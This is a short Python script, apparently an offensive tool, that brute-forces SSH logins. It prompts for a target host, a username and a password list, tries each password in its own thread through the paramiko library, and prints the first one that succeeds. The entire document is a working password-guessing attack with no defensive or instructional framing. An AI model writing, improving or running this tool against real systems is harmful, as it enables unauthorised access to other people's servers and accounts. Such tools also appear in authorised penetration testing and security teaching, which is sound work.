import paramiko , sys , os , socket
import threading , time

stop_flag = 0

def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host,port=22,username=username,password=password)
        stop_flag = 1
        print(f'[+] Found : {password} => username : {username}')
    except:
        print('[-] Fail')
    
    ssh.close()

host = input('[+] Target: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Password File: ')
print('\n')

if os.path.exists(input_file) == False:
    print('[-] Invalid File Provided')
    sys.exit(1)

print(f'Starting on {host}')

with open(input_file,'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()

        password = line.strip()
        t = threading.Thread(target=ssh_connect,args=(password,))
        t.start()
        time.sleep(0.5)

